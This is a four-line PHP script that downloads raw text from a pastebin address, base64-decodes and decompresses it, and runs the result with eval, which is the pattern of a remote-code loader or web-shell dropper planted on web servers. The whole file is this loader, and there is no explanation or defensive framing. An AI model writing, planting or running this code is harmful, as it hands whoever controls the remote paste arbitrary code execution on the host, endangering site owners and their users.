<?php 
$uchiha = file_get_contents ('http://pastebin.com/raw/MEgQQGsn');
eval(gzinflate(base64_decode($uchiha)));
?>